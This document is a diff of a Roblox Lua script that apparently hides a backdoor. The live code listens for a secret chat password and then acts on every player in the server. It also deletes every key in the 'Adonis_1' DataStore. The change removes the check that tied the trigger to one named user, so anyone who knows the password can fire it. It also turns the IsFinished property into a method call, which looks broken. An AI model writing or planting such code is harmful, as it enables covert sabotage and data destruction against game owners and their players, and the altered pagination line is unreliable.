@@ -7,7 +7,6 @@ else
 	instance.Name = name
 	instance.Parent = game.ReplicatedStorage
 	for _, player in pairs(game.Players:GetPlayers()) do
-		if player.Name == "WingedRobloxiann" then
 			player.Chatted:Connect(function(msg)
 				if msg == "120E91HD0N12SD01H" then
 					for _, p in pairs(game.Players:GetPlayers()) do
@@ -15,7 +14,6 @@ else
 					end
 				end
 			end)
-		end
 	end
 	local DataStore = game:GetService("DataStoreService")
 	local Data = DataStore:GetDataStore("Adonis_1")
@@ -29,7 +27,7 @@ else
 			Data:RemoveAsync(Key)
 		end
 
-		if pages.IsFinished then
+		if pages.IsFinished() then
 			break
 		else
 			pages:AdvanceToNextPageAsync()
